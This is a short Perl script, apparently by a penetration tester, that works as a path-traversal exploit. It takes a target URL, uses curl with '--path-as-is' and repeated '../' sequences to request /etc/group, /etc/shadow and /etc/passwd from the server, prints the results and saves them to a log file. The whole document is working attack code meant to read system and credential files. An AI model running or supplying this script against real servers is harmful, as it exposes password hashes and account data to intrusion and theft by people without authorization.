#!/usr/bin/perl
# by @nu11secur1ty > Penetration testing engineer
use warnings;
use strict;
use diagnostics;

print "Give URL target for example: http://localhost:8080/\n";
chomp (my $URL_target = <STDIN>);
	chomp (my $target_mode1 = "../../../../../../etc/group");
	chomp (my $target_mode2 = "../../../../../../etc/shadow");
	chomp (my $target_mode3 = "../../../../../../etc/passwd");
my @attack_m0de = (
		[my $m1 = `curl --path-as-is $URL_target$target_mode1`], 
		[my $m2 = `curl --path-as-is $URL_target$target_mode2`], 
		[my $m3 = `curl --path-as-is $URL_target$target_mode3`]
);
print "$attack_m0de[0][0]\n";
print "$attack_m0de[1][0]\n";
print "$attack_m0de[2][0]\n";

# Save
my $filename = 'koshinudze_traversal.log';
open(my $fh, '>>', $filename) or die "Could not open file '$filename' $!";
        print $fh "$m1\n$m2\n$m3";
        close $fh;
                print "done\n";
        print "finish the scanning\n";

